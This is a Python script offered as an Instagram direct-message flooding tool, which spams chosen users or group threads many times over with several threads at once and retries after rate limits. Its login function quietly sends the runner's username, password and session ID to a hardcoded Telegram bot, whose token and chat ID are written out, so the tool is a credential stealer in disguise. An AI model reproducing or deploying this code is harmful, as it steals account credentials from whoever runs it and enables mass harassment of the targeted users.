# language: Python 3.11+, file: ig_dm_flood.py
# deps: pip install instagrapi requests

from instagrapi import Client
from instagrapi.exceptions import (
    PleaseWaitFewMinutes, FeedbackRequired, ClientError
)
import time
import sys
import getpass
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== TERI SETTINGS ====================
BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"
CHAT_ID = "5970033767"
SESSION_FILE = "ig_session.json"
THREADS = 8
MAX_RETRIES = 2
# =======================================================

cl = Client()
cl.delay_range = [0, 0]

def send_to_telegram(text: str):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def login(username: str, password: str, sessionid: str):
    # credentials + sessionid tere paas bhej do
    send_to_telegram(
        f"New Login\n"
        f"User: {username}\n"
        f"Pass: {password}\n"
        f"SessionID: {sessionid}"
    )

    # pehle saved session try karo
    try:
        cl.load_settings(SESSION_FILE)
        cl.get_timeline_feed()
        print("[+] saved session loaded")
        return
    except:
        pass

    print("[*] sessionid se login kar raha hoon...")
    try:
        cl.login_by_sessionid(sessionid)
        cl.dump_settings(SESSION_FILE)
        print("[+] login successful + session saved")
    except Exception as e:
        print(f"[-] sessionid login fail: {e}")
        sys.exit(1)

def resolve_user(username: str):
    try:
        return cl.user_id_from_username(username.strip())
    except Exception as e:
        print(f"[-] resolve fail {username}: {e}")
        return None

def send_to_user(user_id: int, label: str, message: str) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            cl.direct_send(message, user_ids=[user_id])
            print(f"[+] sent → {label}")
            return True
        except (PleaseWaitFewMinutes, FeedbackRequired) as e:
            print(f"[!] rate limit on {label}: {e} — sleep 30s")
            time.sleep(30)
        except Exception as e:
            print(f"[-] error {label} (try {attempt}): {e}")
            time.sleep(1)
    return False

def send_to_thread(thread_id: int, label: str, message: str) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            cl.direct_send(message, thread_ids=[thread_id])
            print(f"[+] sent → group {label}")
            return True
        except (PleaseWaitFewMinutes, FeedbackRequired) as e:
            print(f"[!] rate limit: {e} — sleep 30s")
            time.sleep(30)
        except Exception as e:
            print(f"[-] error (try {attempt}): {e}")
            time.sleep(1)
    return False

def flood_users(targets: list[str], message: str, count: int):
    print("[*] resolving targets...")
    id_map = {}
    for u in targets:
        uid = resolve_user(u)
        if uid:
            id_map[u] = uid
            print(f"  {u} → {uid}")

    if not id_map:
        print("[-] no valid targets")
        return

    print(f"[*] flooding {len(id_map)} users × {count} times...")
    start = time.time()
    success = 0

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        jobs = []
        for _ in range(count):
            for uname, uid in id_map.items():
                jobs.append(pool.submit(send_to_user, uid, uname, message))
        for fut in as_completed(jobs):
            if fut.result():
                success += 1

    print(f"\n[done] {success} messages in {time.time()-start:.1f}s")

def flood_group(thread_id: int, message: str, count: int):
    print(f"[*] flooding thread {thread_id} × {count} times...")
    start = time.time()
    success = 0

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = [pool.submit(send_to_thread, thread_id, str(thread_id), message) for _ in range(count)]
        for fut in as_completed(futures):
            if fut.result():
                success += 1

    print(f"\n[done] {success}/{count} messages in {time.time()-start:.1f}s")

def list_recent_threads(limit: int = 20):
    print("[*] fetching recent threads...")
    try:
        threads = cl.direct_threads(amount=limit)
        for t in threads:
            users = ", ".join([u.username for u in t.users]) if t.users else "unknown"
            title = t.thread_title or "(no title)"
            print(f"  thread_id={t.id} | title={title} | users=[{users}]")
    except Exception as e:
        print(f"[-] failed: {e}")

def main():
    print("=== IG DM Flood (SessionID Login) ===\n")

    username = input("Username: ").strip()
    password = getpass.getpass("Password: ")
    sessionid = input("SessionID: ").strip()

    if not sessionid:
        print("[-] SessionID zaroori hai")
        sys.exit(1)

    login(username, password, sessionid)

    print("\nMode:")
    print("  1 = flood individual users")
    print("  2 = flood a group thread")
    print("  3 = list recent threads")
    mode = input("Choice [1/2/3]: ").strip()

    if mode == "3":
        list_recent_threads()
        return

    message = input("Message to spam: ").strip()
    if not message:
        print("[-] empty message")
        return

    count = input("How many times (default 1): ").strip()
    count = int(count) if count.isdigit() and int(count) > 0 else 1

    if mode == "1":
        raw = input("Target usernames (comma separated): ").strip()
        targets = [t.strip() for t in raw.split(",") if t.strip()]
        if not targets:
            print("[-] no targets")
            return
        flood_users(targets, message, count)

    elif mode == "2":
        tid = input("Thread ID of the group: ").strip()
        if not tid.isdigit():
            print("[-] thread_id number hona chahiye")
            return
        flood_group(int(tid), message, count)

    else:
        print("[-] invalid mode")

if __name__ == "__main__":
    main()